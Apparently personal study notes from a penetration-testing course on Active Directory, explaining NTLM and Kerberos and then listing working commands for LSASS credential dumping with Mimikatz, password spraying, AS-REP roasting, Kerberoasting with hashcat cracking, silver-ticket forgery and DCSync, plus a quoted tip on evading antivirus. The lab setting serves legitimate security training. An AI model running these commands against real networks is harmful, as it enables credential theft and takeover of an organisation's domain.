
## Authentication


### NTLM

is used when:
- client authenticates by IP
- user attempting to authenticate to hostname not registered on AD integrated DNS
- Third-party applications may choose to use NTLM instead of kerberos

NTLM is a "fast-hashing" algorithm in the fact that it is generally small in size and can be cracked easily

It is still common in modern systems due to a lot of 3rd party applications. It is also useful is case there is a need for a fallback method.

### Kerberos

The Primary authentication mechanism. Uses a ticket system. Domain Controller acts as the KDC to provide session tickets and temporary session keys.

1. client starts authentication against the domain controller acting as the KDC (key distribution center) with an Authentication server request (AS-REQ)
	1. The AS-REQ contains a timestamp that is encrypted using a hash derived from the password of the user and their username
2. Once received the DC looks up the password hash associated with the user in the `ntds.dit` file and attempts to decrypt the timestamp (if successful auth is considered successful)
3. DC then response to client with an AS-REP containing a `session key` and a `Ticket Granting Ticket`.
	1. the session key is encrypted with the users password hash and can be decrypted by the client  and then reused
	2. the TGT contains information about the user, the domain, a timestamp, the ip address of the client and the session key
	3. To avoid tampering the TGT is encrypted by a secret key (NTLM hash of the krbgt account) - known only by the KDC and cannot be decrypted by the client.
4. The client is now considered authenticated
5. The ticket will expire after ten hours by default and require renewal

further on when the client wants to access resources on the network it will now:
1. construct a `Ticket Granting Service Request` (TGS-REQ) containing:
	1. current user and timespace encrypted with the session key
	2. name of the resource
	3. encrypted TGT
2. Sends it to the KDC
3. KDC receives ticket and if the resource exists:
	1. TGT is decrypted using secret key only known to the KDC
	2. session key is extracted from the TGT and used to decrypt username and timestamp
4. the KDC then checks:
	1. TGT has valid time stamp
	2. username from the TGS-REQ matches username from the TGT
	3. client IP coincides with the TGT IP address
5. if successful the ticket granting service on the KDC responds with a `Ticket Granting Server Reply` (TGS-REP) containing:
	1. name of the service which access has been granted
	2. session key to user between client and service
	3. service ticket containing username and group permissions along with newly created session key
6. Service tickets service name and session key are encrypted using the original session key associated with the creation of the TGT
7. Service ticket is encrypted using the password hash of the service account registered with the service in question

Now that the KDC has process the authentication and the client ahs both a session key and a service ticket the service authentication begins:
1. client send the application server an `Application Request (AP-REQ)` including a the tuser name and timestamp encrypted  with the session key associated with the service ticket along with the ticket itself
2. application server decrypts the service ticket us the service account password hash and extract the username and session key
3. it then uses the latter to decrypt the username from the AP-REQ
4. if the AP-REQ username matches the one decrypted from the service ticket the request is accepted
5. before access is granted:
	1. service inspects the supplied group memberships in service ticket
	2. assigns appropriate permissions to the user
6. user may now access service


### Cached AD Credentials

In modern version of windows password hashes that are used for renewing TGT reqs are stored in the LSASS memory space.

if we gain access to these hashes we could crack them. We will need SYSTEM of local administrator to access these hashes

Mimikatz will be useful for this once we have gained elevated privs.

`due to the mainstream popularity of Mimikatz and well-known detection signatures, consider avoiding using it as a standalone application and use methods discussed in the Antivirus Evasion Module instead. For example, execute Mimikatz directly from memory using an injector like PowerShell,4 or use a built-in tool like Task Manager to dump the entire LSASS process memory,5 move the dumped data to a helper machine, and then load the data into Mimikatz.`

#### Using MimiKatz

start mimikatz:
```
.\mimikatz.exe
```

engage SeDebugPrivlege:
```
privilege::debug
```

now we can use sekurlsa to dump the password of all logged on users on the current machine:
```
sekurlsa::logonpasswords
```

we are interested in the NTLM and SHA1 hashes

We could crack these passwords

we can also attempt to extract kerberos tickets:
```
sekurlsa::tickets
```

extract s TGT would be useful for us to authenticate against other services in the system while a TGS would be useful for authenticating to services the user we extracted it from is already authenticated to.

### Password Attacks

Before attacking password in AD we need to check account policies for lockout rules in place.
This is to ensure we don't alert administrators and lock our selves out of an attack vector indefinitely.

check account policy:
```
net accounts
```

password spray using crackmapexec:
```
crackmapexec smb 192.168.50.75 -u users.txt -p 'Nexus123!' -d corp.com --continue-on-success
```

if we find a password we can use this to determine if we have Admin as it will append (pwn3d):
```
crackmapexec smb 192.168.50.75 -u dave -p 'Flowers1' -d corp.com
```

we can spray the credentials to find if there a system where the user is an admin:
```
crackmapexec smb ips.txt -u 'pete' -p 'Nexus123!' -d corp.com
```

we can also spray TGT by using kerbrute:
```
kerbrute passwordspray -d corp.com usernames.txt "password"
```

If you receive a network error, make sure that the encoding of **usernames.txt** is _ANSI_. You can use Notepad's _Save As_ functionality to change the encoding.


### AS-REP Roasting

The technique relies on kerberos preauthentication being disabled - without it being disabled we can not send requests on behalf of users - with it disabled we can perform offline password attacks and send requests on behalf of users in the form of AS-REQ to receive and AS-REP. The AS-REP containing the session key and TGT.

It is common to find accounts with preauthentication disabled as some applications and technologies require it to function properly.

enumerate for users with the preauthentication disabled:
```
impacket-GetNPUsers -dc-ip DC_IP  -request -outputfile hashes.asreproast domain/user
```

example usage:
`impacket-GetNPUsers -dc-ip 192.168.50.70  -request -outputfile hashes.asreproast corp.com/pete`

when we find a user we will receive the AS-REP in our output file which we can use hashcat to crack and retrieve the users password:
```
sudo hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
```

We can also make use of `Rubeus` on a windows machine as an already authenticated user to automatically find vulnerable users:
```
.\Rubeus.exe asreproast /nowrap
```

and crack the result with hashcat

If we do not find accounts with this preauth disabled - but we have genericwrite or generic all permissions against another account - we could change the password but in a real engagement we could disable preauth and AS-REP roast in a targets as-rep roast attack.


### Kerberoasting

This is attacking the TGS-REP hash. For SPNs running in the context of a user.

With Kerberoasting we can request a service ticket from the DC. for a service in order to access a service hosted by an SPN. The DC doesn't check if the user is authorized to access the server. That is part of the 2nd part against the application the user is trying to access. We can attempt to crack the hash of the service ticket to gain access to the service account.

The service ticket is encrypted with the SPNs password hash. if we can request the ticket and decrypt it we can use this information to crack the cleartext password of the service account.

this can be done using rubeus:
```
.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
```

This can also be done with impacket:
```
sudo impacket-GetUserSPNs -request -dc-ip 192.168.50.70 corp.com/pete
```
If impacket-GetUserSPNs throws the error "KRB_AP_ERR_SKEW(Clock skew too great)," we need to synchronize the time of the Kali machine with the domain controller. We can use ntpdate3 or rdate4 to do so.

and if we find any hashes we can attempt to crack them with:
```
sudo hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
```

`If the SPN runs in the context of a computer account cracking is infeasible but in the context of a user account our chances are much greater`

If we find an account we have generic all permissions for we could set an SPN and kerberoast their hash to crack their password.


### Silver Tickets

This utilizes a technique where we forge our own service tickets

The application on the server executing in the context of the service account checks the users permissions from the group memberships included in the service ticket - however these are not verified by the application in a majority of environments. In this case the application blindly trusts the integrity of the service ticket - since it in encrypted with a password hash that is meant to only be known to the service account and the domain controller. This check is supported by `Privileged Account Certificate validation` and is an optional process between the SPN application and the domain controller. service application rarely perform PAC validation.

With a service account password or its NTLM we can forge our own service ticket to access the target resource with any permissions we desire. This is known as a silver ticket. and if the SPN is used on multiple servers, the silver ticket can be leveraged  against them all.

To create a silver ticket we need:
- SPN password hash
- Domain SID
- Target SPN

in this example we are targeting iss_service

confirming we do not have a access with usual credentials:
```
iwr -UseDefaultCredentials http://web04
```

if we are an admin on the current machine that is running  the service we are targeting we can utilize Mimikatz to extract the hash of the service user:

```
privilege::debug
```

```
sekurlsa::logonpasswords
```

as part of the output from mimikatz we must also get the SID:
```
S-1-5-21-1987370270-658905905-1781884369-1109 #1109 is the user identifier, we dont include that

domain SID: S-1-5-21-1987370270-658905905-1781884369
```

we cans also get the sid with:
```
whoami /user
```

we can now create a silver ticket using mimikatz:
```
kerberos::golden /sid:S-1-5-21-1987370270-658905905-1781884369 /domain:corp.com /ptt /target:web04.corp.com /service:http /rc4:4d28cf5252d39971419580a51484ca09 /user:jeffadmin
```

notice we used jeffadmin instead of jeff because we can set any permissions and groups ourselves.

This ticket will then be loaded into memory and used.

we can confirm this with `klist`

and can retest access with:
```
iwr -UseDefaultCredentials http://web04
```

which should now be successful

### Domain Controller Synchronization

In prod environments we use redundant DCs to provide redundancy. The Directory Replication Service remote protocol uses replication to synchronize these redundant domain controllers. A domain controller may request an update for a specific object like an account using the IDL_DRSGetNCChanges API.

The domain controller receiving the request for an update does not check if the DC is known. it Only verifies the associated SID has appropriate privileges.

We can attempt to issue a rogue update request to a dc from a user with certain rights and it will succeed.

these permissions include:
- Replicating Directory Changes
- Replicating Directory Changes All
- Replicating Directory Changes in Filtered Set

Domain Admins, Enterprise Admins and Administrators group have the rights by default.

If  we gain access to a user in these groups we can perform a dcsync attack. With this attack we impersonate a DC. This allows us to request any user credentials from the domain.

We can do this using Mimikatz or impacket-secretsdump.

using mimikatz:
```
lsadump::dcsync /user:corp\dave
```

with `corp\dave` we are using the `domain\user`

this should dump the NTLM which we can crack with hashcat:
```
hashcat -m 1000 hashes.dcsync /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
```

`We can even perform this attack against the Administrator user`

using impacket to perform the same attack:
```
impacket-secretsdump -just-dc-user dave corp.com/jeffadmin:"BrouhahaTungPerorateBroom2023\!"@192.168.50.70
```

and get the following output:
```
[*] Using the DRSUAPI method to get NTDS.DIT secrets
dave:1103:aad3b435b51404eeaad3b435b51404ee:08d7a47a6f9f66b97b1bae4178747494:::
```
we are interested in the last hash

### Mimikatz

can be used like so:

```
$results = .\mimikatz.exe privilege::debug sekurlsa::logonpasswords exit

And then simply use $results to read the output
```